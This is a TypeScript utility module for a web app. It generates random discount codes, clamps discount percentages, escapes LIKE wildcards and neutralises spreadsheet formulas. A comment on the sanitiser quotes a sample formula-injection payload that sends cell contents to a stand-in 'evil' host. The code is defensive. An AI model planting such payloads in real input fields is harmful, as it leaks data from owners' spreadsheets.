// Tested reference for the discount-code format, unit-tested from src via Vitest.
// The on-session-created Edge Function keeps an INLINE copy of these functions (so it
// deploys as a single self-contained file from the Supabase Dashboard) — keep the
// two in lockstep if the format ever changes. Runtime-agnostic (no Deno globals).
//
// Format: SUP-XXXXXXXX## — 8 uppercase hex chars (4 random bytes, 2^32 space, so
// enumeration is impractical) followed by the 2-digit discount % for at-a-glance
// readability by store consultants.

export const DEFAULT_DISCOUNT_PERCENT = 5;
/** The code carries the percentage in two digits. */
export const MAX_DISCOUNT_PERCENT = 99;

/**
 * The discount is whatever the STORE configured for the product (product_settings) — never a
 * number sent by the browser. Anything that is not a sane percentage falls back to the default
 * (missing / NaN / text) or is clamped into 0–99, so the code always carries exactly two digits.
 */
export function clampDiscountPercent(value: unknown): number {
  const n = typeof value === "number" ? value : typeof value === "string" && value.trim() !== "" ? Number(value) : Number.NaN;
  if (!Number.isFinite(n)) return DEFAULT_DISCOUNT_PERCENT;
  return Math.min(MAX_DISCOUNT_PERCENT, Math.max(0, Math.round(n)));
}

export function genDiscountCode(discountPct: number): string {
  const bytes = new Uint8Array(4);
  crypto.getRandomValues(bytes);
  const hex = Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join("").toUpperCase();
  return `SUP-${hex}${String(clampDiscountPercent(discountPct)).padStart(2, "0")}`;
}

/** Escape LIKE/ILIKE wildcards so ilike() can serve as a case-insensitive equality on an e-mail address. */
export function escapeLike(s: string): string {
  return s.replace(/[\\%_]/g, "\\$&");
}

/**
 * A value that is safe to write into a spreadsheet cell. Google Sheets / Excel evaluate a cell that
 * starts with = + - @ as a FORMULA — and the lead's name and e-mail come from a public (anon-key)
 * client, so `=IMPORTXML("http://evil/?"&A2,"//a")` as a first name would run inside the owner's CRM
 * sheet. A leading apostrophe stores the text as text.
 */
export function sheetsSafe(value: unknown, max = 500): string {
  const text = String(value ?? "").replace(/[\r\n]+/g, " ").trim().slice(0, max);
  return /^[=+\-@]/.test(text) ? `'${text}` : text;
}
